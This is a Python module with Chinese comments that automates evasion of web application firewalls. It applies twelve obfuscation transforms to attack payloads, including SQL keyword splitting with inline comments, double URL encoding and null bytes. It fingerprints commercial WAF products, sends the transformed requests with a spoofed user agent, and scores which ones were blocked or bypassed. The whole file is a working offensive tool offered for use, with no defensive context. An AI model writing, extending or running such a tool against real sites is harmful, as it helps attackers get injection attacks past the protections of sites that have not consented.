"""
security/waf_bypass.py - WAF绕过自动化闭环

核心能力：
- 整合12种payload变换技术
- 自动发送变换后的payload并判断是否绕过
- 记录每种变换的成功率，自适应选择最有效组合
- 支持多种WAF产品的指纹识别和针对性绕过
- 绕过结果统计和报告生成
"""
import os
import re
import sys
import json
import time
import uuid
import socket
import hashlib
import threading
import urllib.parse
import urllib.request
import urllib.error
from typing import Any, Dict, List, Optional, Tuple, Set, Callable
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict, Counter


# ================================================================
# 枚举和数据结构
# ================================================================
from .models import *  # noqa: F401,F403

class PayloadTransformer:
    """Payload变换器 - 实现12种绕过变换技术"""

    def __init__(self):
        self.transforms = {
            "case_random": self._case_random,
            "url_encode": self._url_encode,
            "double_url_encode": self._double_url_encode,
            "html_encode": self._html_encode,
            "base64_encode": self._base64_encode,
            "inline_comment": self._inline_comment,
            "tab_replace": self._tab_replace,
            "newline_split": self._newline_split,
            "paren_replace": self._paren_replace,
            "unicode_encode": self._unicode_encode,
            "hex_encode": self._hex_encode,
            "null_byte": self._null_byte,
        }

    def transform(self, payload: str, technique: str) -> str:
        """应用指定变换"""
        transform_fn = self.transforms.get(technique)
        if transform_fn:
            return transform_fn(payload)
        return payload

    def transform_chain(self, payload: str, techniques: List[str]) -> str:
        """应用变换链"""
        result = payload
        for technique in techniques:
            result = self.transform(result, technique)
        return result

    def get_all_techniques(self) -> List[str]:
        return list(self.transforms.keys())

    def get_technique_description(self, technique: str) -> str:
        descriptions = {
            "case_random": "随机大小写变换",
            "url_encode": "URL编码",
            "double_url_encode": "双重URL编码",
            "html_encode": "HTML实体编码",
            "base64_encode": "Base64编码",
            "inline_comment": "内联注释注入",
            "tab_replace": "空格替换为制表符",
            "newline_split": "换行分割关键字",
            "paren_replace": "括号替换",
            "unicode_encode": "Unicode编码",
            "hex_encode": "十六进制编码",
            "null_byte": "空字节注入",
        }
        return descriptions.get(technique, technique)

    def _case_random(self, payload: str) -> str:
        """随机大小写"""
        import random
        result = []
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return "".join(result)

    def _url_encode(self, payload: str) -> str:
        """URL编码"""
        return urllib.parse.quote(payload, safe="")

    def _double_url_encode(self, payload: str) -> str:
        """双重URL编码"""
        once = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(once, safe="")

    def _html_encode(self, payload: str) -> str:
        """HTML实体编码"""
        import html
        return html.escape(payload, quote=True)

    def _base64_encode(self, payload: str) -> str:
        """Base64编码"""
        import base64
        return base64.b64encode(payload.encode("utf-8")).decode("utf-8")

    def _inline_comment(self, payload: str) -> str:
        """内联注释注入（SQL专用）"""
        keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER", "CREATE", "FROM", "WHERE", "AND", "OR"]
        result = payload
        for kw in keywords:
            result = re.sub(rf"\b{kw}\b", f"{kw[:1]}/**/{kw[1:]}", result, flags=re.IGNORECASE)
        return result

    def _tab_replace(self, payload: str) -> str:
        """空格替换为制表符"""
        return payload.replace(" ", "\t")

    def _newline_split(self, payload: str) -> str:
        """换行分割"""
        return payload.replace(" ", "%0a")

    def _paren_replace(self, payload: str) -> str:
        """括号替换"""
        return payload.replace("(", "%28").replace(")", "%29")

    def _unicode_encode(self, payload: str) -> str:
        """Unicode编码"""
        result = []
        for c in payload:
            if ord(c) > 127 or c.isalpha():
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)

    def _hex_encode(self, payload: str) -> str:
        """十六进制编码"""
        return "".join(f"%{ord(c):02x}" for c in payload)

    def _null_byte(self, payload: str) -> str:
        """空字节注入"""
        return payload + "%00"

class WAFDetector:
    """WAF检测器 - 识别WAF产品、判断请求是否被拦截"""

    def __init__(self):
        self.waf_signatures = self._init_waf_signatures()
        self.block_indicators = self._init_block_indicators()

    def _init_waf_signatures(self) -> Dict[str, List[str]]:
        """WAF指纹库"""
        return {
            "Cloudflare": [
                "server: cloudflare", "cf-ray", "__cfduid", "cf-cache-status",
                "cloudflare-nginx", "attention required", "checking your browser",
                "Error 1020", "Error 1015", "Error 1010",
            ],
            "AWS WAF": [
                "x-amzn-requestid", "aws-waf", "Request blocked", "AWS WAF",
                "x-amz-cf-id", "awselb",
            ],
            "Akamai": [
                "server: akamaighost", "x-akamai-transformed", "akamai",
                "x-cache", "x-served-by", "pragma: akamai-x-cache",
            ],
            "Imperva": [
                "x-cdn", "imperva", "incapsula", "x-iinfo", "visid_incap",
                "incap_ses", "Error 403",
            ],
            "F5 BIG-IP": [
                "bigip", "f5", "x-cnection", "x-wa-info", "ts", "BIGipServer",
                "MRHSequence",
            ],
            "Barracuda": [
                "barracuda", "x-barracuda", "barracudaloadbalancer",
            ],
            "Sucuri": [
                "sucuri", "x-sucuri-id", "x-sucuri-cache", "sucuri/websitefirewall",
            ],
            "Wordfence": [
                "wordfence", "wfvt", "wordfence_verifiedHuman",
            ],
            "ModSecurity": [
                "mod_security", "modsecurity", "nosniff", "x-frame-options",
                "request method not allowed", "406 Not Acceptable",
            ],
        }

    def _init_block_indicators(self) -> List[Dict]:
        """拦截指示器"""
        return [
            {"pattern": "403", "type": "status_code", "description": "403 Forbidden"},
            {"pattern": "406", "type": "status_code", "description": "406 Not Acceptable"},
            {"pattern": "429", "type": "status_code", "description": "429 Too Many Requests"},
            {"pattern": "blocked", "type": "content", "description": "包含blocked关键词", "ignore_case": True},
            {"pattern": "access denied", "type": "content", "description": "访问被拒绝", "ignore_case": True},
            {"pattern": "forbidden", "type": "content", "description": "禁止访问", "ignore_case": True},
            {"pattern": "attack detected", "type": "content", "description": "检测到攻击", "ignore_case": True},
            {"pattern": "malicious", "type": "content", "description": "恶意请求", "ignore_case": True},
            {"pattern": "security", "type": "content", "description": "安全拦截", "ignore_case": True},
            {"pattern": "captcha", "type": "content", "description": "验证码页面", "ignore_case": True},
            {"pattern": "challenge", "type": "content", "description": "挑战页面", "ignore_case": True},
            {"pattern": "attention required", "type": "content", "description": "需要验证", "ignore_case": True},
        ]

    def detect_waf(self, url: str, headers: Dict = None, body: str = "") -> WAFProduct:
        """检测WAF产品"""
        all_text = ""
        if headers:
            all_text += " ".join(f"{k}: {v}" for k, v in headers.items())
        if body:
            all_text += " " + body

        scores = defaultdict(int)
        for product, signatures in self.waf_signatures.items():
            for sig in signatures:
                if sig.lower() in all_text.lower():
                    scores[product] += 1

        if scores:
            best_product = max(scores, key=scores.get)
            if scores[best_product] >= 1:
                return WAFProduct(best_product)

        return WAFProduct.UNKNOWN

    def is_blocked(self, status_code: int, headers: Dict = None, body: str = "",
                    baseline_length: int = 0) -> Tuple[bool, List[str]]:
        """判断请求是否被WAF拦截"""
        indicators = []

        # 状态码检测
        for indicator in self.block_indicators:
            if indicator["type"] == "status_code":
                if str(status_code) == indicator["pattern"]:
                    indicators.append(indicator["description"])

        # 内容检测
        if body:
            for indicator in self.block_indicators:
                if indicator["type"] == "content":
                    pattern = indicator["pattern"]
                    if indicator.get("ignore_case"):
                        if pattern.lower() in body.lower():
                            indicators.append(indicator["description"])
                    else:
                        if pattern in body:
                            indicators.append(indicator["description"])

        # 响应长度异常检测
        if baseline_length > 0 and body:
            body_length = len(body)
            if body_length < baseline_length * 0.3:
                indicators.append(f"响应长度异常({body_length} < 基线{baseline_length}*0.3)")

        return len(indicators) > 0, indicators

    def is_bypassed(self, status_code: int, headers: Dict = None, body: str = "",
                     baseline_length: int = 0, expected_content: str = "") -> Tuple[bool, List[str]]:
        """判断是否成功绕过WAF"""
        indicators = []

        # 状态码正常
        if status_code in (200, 201, 202, 204, 301, 302, 304):
            indicators.append(f"状态码正常({status_code})")

        # 响应长度接近基线
        if baseline_length > 0 and body:
            body_length = len(body)
            if baseline_length * 0.7 < body_length < baseline_length * 1.3:
                indicators.append(f"响应长度接近基线({body_length} vs {baseline_length})")

        # 包含预期内容
        if expected_content and body and expected_content in body:
            indicators.append(f"包含预期内容: {expected_content[:50]}")

        # 没有拦截指示器
        blocked, block_indicators = self.is_blocked(status_code, headers, body, baseline_length)
        if not blocked:
            indicators.append("无拦截指示器")
        else:
            return False, block_indicators

        # 需要至少2个正向指标才算绕过
        return len(indicators) >= 2, indicators

class _BypassHttpClient:
    """WAF绕过专用HTTP客户端"""

    def __init__(self, timeout: int = 10, user_agent: str = ""):
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    def send(self, url: str, method: str = "GET", params: Dict = None,
             data: Dict = None, headers: Dict = None, cookies: Dict = None) -> Tuple[int, Dict, str, float]:
        """发送请求，返回(status_code, headers, body, response_time_ms)"""
        start = time.time()
        full_url = url
        if params:
            separator = "&" if "?" in full_url else "?"
            full_url = full_url + separator + urllib.parse.urlencode(params)

        req_headers = dict(headers or {})
        req_headers.setdefault("User-Agent", self.user_agent)
        if cookies:
            req_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

        post_data = None
        if data:
            post_data = urllib.parse.urlencode(data).encode("utf-8")

        try:
            req = urllib.request.Request(full_url, data=post_data, headers=req_headers, method=method)
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            status = resp.getcode()
            resp_headers = dict(resp.headers)
            body = resp.read().decode("utf-8", errors="replace")
            elapsed = (time.time() - start) * 1000
            return status, resp_headers, body, elapsed
        except urllib.error.HTTPError as e:
            status = e.code
            resp_headers = dict(e.headers) if e.headers else {}
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            elapsed = (time.time() - start) * 1000
            return status, resp_headers, body, elapsed
        except Exception as e:
            return 0, {}, str(e), (time.time() - start) * 1000
